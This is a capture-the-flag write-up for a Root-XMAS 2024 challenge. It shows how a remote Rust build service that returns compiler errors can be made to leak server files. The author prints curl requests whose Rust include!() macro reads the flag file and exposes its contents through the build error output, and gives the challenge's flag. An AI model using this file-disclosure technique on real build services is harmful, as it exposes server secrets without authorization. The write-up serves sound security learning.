---
title: Root-XMAS 2024 Day 04 - Build And Drustroy
feed: hide
permalink: /RootXMAS_2024_04
date: 04-12-2024
summary: Rust is safe, so my project has no vulns.
---
### summary

A service where we can compile a Rust file, but it doesn't get executed.
However, we get the build errors returned, so we can get some compile time code generation containing the flag file with `include!()` macro. 
### recon

Yay , Rust, [I love Rust!](https://youtu.be/o-VizqRKekI?si=lBJ3Dr7f9eTfEhlk) 🦀
So we get an example usage of the service and its source code.

We send our Rust source code to the service and a compiled executable will be returned:

```bash
curl -sSk -X POST -H 'Content-Type: application/json' https://day4.challenges.xmas.root-me.org/remote-build -d '{"src/main.rs":"fn main() { println!(\"Hello, world!\"); }"}' --output binary

	file binary
```

The source code is pretty verbose, that's Rust for you, but it means there is great error handling to make it safer!
The interesting bits:

```rust
	for filename in map.keys() {
		if !filename.ends_with(".rs") || filename.contains("..") {
			let mut response = Response::new(full("Grrrrr(ust)."));
			*response.status_mut() = StatusCode::FORBIDDEN;
```

Means we can upload multiple files, but can't do path traversal or upload another kind of file, like a new `Cargo.toml`

```rust
let cargo_toml = r#"
[package]
name = "temp_build"
version = "0.1.0"
edition = "2021"

[dependencies]
"#;
```

Speaking of which, the `cargo.toml` does not allow any dependency.

```rust
if !build_output.status.success() {
	let stderr = String::from_utf8_lossy(&build_output.stderr);
	...
	let mut response = Response::new(full(format!("Build failed: {}", stderr)));
	*response.status_mut() = StatusCode::BAD_REQUEST;
```

Now for the interesting part: the build error messages are returned in the request response!
That's nice, we can have the feedback of the great Rust compiler to fix our code!

Of course, we could also abuse it to execute macros and leak the flag!
### solution

As I was a bit... rusty, I googled "rust compile time code execution macro" and it lead on the Reddit post [Execute code once at compile time?](https://www.reddit.com/r/rust/comments/g19aal/execute_code_once_at_compile_time/) , explaining the use of the [include!](https://doc.rust-lang.org/std/macro.include.html) macro.

as its name suggests, it includes content of a file as code at build time.
It is used to add Rust files from anywhere in the file system, with apparently legitimate use for including documentation and build artifact files.

Now if our included file happened not to be valid rust code, build would fail and the compiler would nicely tell us what would be the problem :)

let's try it!

```bash
curl -sSk ... -d '{"src/main.rs":"fn main() { include!(\"/flag.txt\"); }"}'
	Build failed:    Compiling temp_build
	error: couldn't read /flag.txt: No such file or directory
	 --> src/main.rs:1:13
	1 | fn main() { include!("/flag.txt"); }
```

Oh wait, where is the flag?
Silly me, the path was in the `docker-compose.yml` !

```yaml
volumes:
- ./flag.txt:/flag/randomflaglolilolbigbisous.txt
```

```bash
curl -sSk -d '{"src/main.rs":"fn main() { include!(\"/flag/randomflaglolilolbigbisous.txt\"); }"}'
	Build failed:    Compiling temp_build
	error[E0425]: cannot find value `OffenSkillSaysHi2024RustAbuse` in this scope
	 --> /flag/randomflaglolilolbigbisous.txt:1:1
	  |
	1 | OffenSkillSaysHi2024RustAbuse
	  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ not found in this scope
```

As simple as one macro call!


| Previous day | [[Day 03 - Santa's Magic Sack]]   |
| ------------ | --------------------------------- |
| Next day     | [[Day 05 - The Friendly Snowman]] |